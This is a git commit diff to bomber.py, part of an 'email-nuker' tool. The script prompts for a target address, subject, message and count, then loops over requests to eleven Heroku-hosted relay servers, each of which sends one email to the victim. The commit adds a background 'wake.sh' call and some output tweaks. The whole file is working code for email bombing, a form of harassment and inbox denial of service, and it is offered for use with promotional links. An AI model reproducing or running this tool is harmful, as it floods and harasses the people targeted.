e3c6bafe3fb19d744e366ae4cf3810d3fa98bdbf
bagarrattaa <apple.macos.ios.6@gmail.com>
2022-02-21 20:27:32 +0530

    uhhh

--- bomber.py
+++ bomber.py
@@ -1,5 +1,6 @@
 import requests 
 import random
+import os 
 print ("email-nuker version: 1.0.2")
 print ("github: https://github.com/bagarrattaa/email-nuker ")
 print ("join the official discord server of email-nuker for latest updates !!")
@@ -11,11 +12,16 @@ msg=str(input("enter message "))
 msg=msg.replace(" ","%20")
 sub=sub.replace(" ","%20")
 srvrlist={1:"https://emailbomber-1.herokuapp.com",2:"https://emailbomber-2.herokuapp.com",3:"https://emailbomber-3.herokuapp.com",4:"https://emailbomber-4.herokuapp.com",5:"https://emailbomber-5.herokuapp.com",6:"https://emailbomber-6.herokuapp.com",7:"https://emailbomber-7.herokuapp.com",8:"https://emailbomber-8.herokuapp.com",9:"https://emailbomber-9.herokuapp.com",10:"https://emailbomber-10.herokuapp.com",11:"https://emailbomber-11.herokuapp.com"}
-am=int(input("enter amount of msgs to send"))
+am=int(input("enter amount of msgs to send "))
+os.system("bash wake.sh &")
+
+
 for i in range(0,am): 
+    # os.system("clear")
     srvr=random.randint(1,11)
     req=requests.get(srvrlist.get(srvr)+"/bomb/"+to+"/"+sub+"/"+msg)
     if req.text=="Sent": 
+        print("           ")
         print (i+1)
     else: 
         print ("failed to send msg ")
